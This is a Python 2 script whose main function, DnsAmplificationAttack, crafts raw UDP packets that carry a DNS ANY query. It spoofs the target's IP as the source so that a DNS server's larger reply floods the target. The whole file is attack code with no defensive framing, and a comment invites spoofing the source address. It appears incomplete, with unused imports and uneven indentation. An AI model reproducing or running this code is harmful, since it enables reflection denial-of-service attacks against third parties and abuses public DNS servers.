import os
import sys
import array
import argparse
import socket
from struct import *
from collections import namedtuple

if pack("H",1) == "\x00\x01": # big endian
    def checksum(pkt):
        if len(pkt) % 2 == 1:
            pkt += "\0"
        s = sum(array.array("H", pkt))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        s = ~s
        return s & 0xffff
else:
    def checksum(pkt):
        if len(pkt) % 2 == 1:
            pkt += "\0"
        s = sum(array.array("H", pkt))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        s = ~s
        return (((s>>8)&0xff)|s<<8) & 0xffff

def BuildDNSHedaer():

	DNSId = os.getpid()
	DNSflags = 0x0100
	DNSqcount = 1
	DNSans = 0
	DNSauth = 0
	DNSadd = 0

	# the ! in the pack format string means network order
	dnsHeader = pack('!HHHHHH', DNSId, DNSflags, DNSqcount, DNSans, DNSauth, DNSadd)
	return dnsHeader

def BuildIpHedaer(srcIP, DstIP): 
	# ip header fields
	ip_ihl = 5
	ip_ver = 4
	ip_tos = 0
	ip_tot_len = 0  # kernel will fill the correct total length
	ip_id = 54321   #Id of this packet
	ip_frag_off = 0
	ip_ttl = 255
	ip_proto = socket.IPPROTO_UDP
	ip_check = 0    # kernel will fill the correct checksum
	ip_saddr = socket.inet_aton ( srcIP )   #Spoof the source ip address if you want to
	ip_daddr = socket.inet_aton ( DstIP )
	 
	ip_ihl_ver = (ip_ver << 4) + ip_ihl
	 
	# the ! in the pack format string means network order
	ipHeader = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

	return ipHeader

def BuildDNSNameNotationFormat(dnsRecord):

	dnsFormat = ""
	for label in dnsRecord.split('.'):
		length = len(label)
		dnsFormat += pack('B', length) + label

	dnsFinalFormat = pack('!32s', dnsFormat)
	return dnsFinalFormat


def DnsAmplificationAttack(trgt_ip, trgt_p, dns_srv, dns_p, dns_record):

	#Build the dns Header
	dnsHeader = BuildDNSHedaer()

	# Build the dns format
	dnsFormat = BuildDNSNameNotationFormat(dns_record)

	# Add the dns detail
	qtype = 0x00ff
	qclass = 0x1
	dnsQuery = pack('!HH', qtype, qclass)

	# Define the ip header message
	ipHeader = BuildIpHedaer(trgt_ip, dns_srv)

	# Build udp header
	udpSource = trgt_p
	udpDest = dns_p
	udpLen = 8 + len(dnsHeader) + len(dnsFormat) + len(dnsQuery)
	udpCheck = 0;

	udpHeader = pack('!HHHH', udpSource, udpDest, udpLen, udpCheck)

    #BuildPseudoHeader
	pshdrSaddr = socket.inet_aton(trgt_ip)
	pshdrDaddr = socket.inet_aton(dns_srv)
	pshdrFiller = 0
	pshdrProtocol = socket.IPPROTO_UDP
	pshdrLen = len(udpHeader) + len(dnsHeader) + len(dnsFormat) + len(dnsQuery)
	psHdr = pack('!4s4sBBH', pshdrSaddr, pshdrDaddr, pshdrFiller, pshdrProtocol, pshdrLen)

	# Calculate the pseudo checksum for udp header
	psGram = psHdr + udpHeader + dnsHeader + dnsFormat + dnsQuery
	udpCheck = checksum(psGram)
 	udpFinalHeader = pack('!HHHH', udpSource, udpDest, udpLen, udpCheck)

	# now start constructing the packet
	packet =  ipHeader + udpFinalHeader + dnsHeader + dnsFormat + dnsQuery

	#create a raw socket
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		s.sendto(packet, (dns_srv, 0))
	except socket.error , msg:
    		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]

    	sys.exit()

	#send message
